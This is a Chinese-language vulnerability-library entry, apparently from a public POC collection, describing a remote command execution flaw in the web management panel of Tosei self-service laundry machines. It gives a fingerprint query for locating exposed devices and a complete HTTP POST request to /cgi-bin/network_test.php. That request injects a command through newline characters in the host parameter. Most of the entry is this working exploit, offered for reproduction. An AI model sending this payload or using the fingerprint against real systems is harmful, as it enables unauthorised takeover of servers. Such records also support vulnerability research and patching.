---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# Tosei 自助洗衣机 web 管理端 network_test.php 文件 host 参数远程命令执行漏洞

# 一、漏洞简介
Tosei 自助洗衣机 是日本 Tosei 公司的一个产品。Tosei 自助洗衣机 web 管理端存在安全漏洞，攻击者利用该漏洞可以通过 network_test.php 的命令执行,在服务器任意执行代码，获取服务器权限，进而控制整个服务器。

# 二、影响版本
+ Tosei 自助洗衣机 web 管理端

# 三、资产测绘
+ hunter`web.body="tosei_login_check.php"`
+ 特征


# 四、漏洞复现
访问poc出现如下页面表示可能存在漏洞

```plain
/cgi-bin/network_test.php
```


修改host参数为想要执行的命令

```plain
POST /cgi-bin/network_test.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Connection: close
Upgrade-Insecure-Requests: 1

host=%0aid%0a&command=ping
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bihozhmkgaeqymw2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
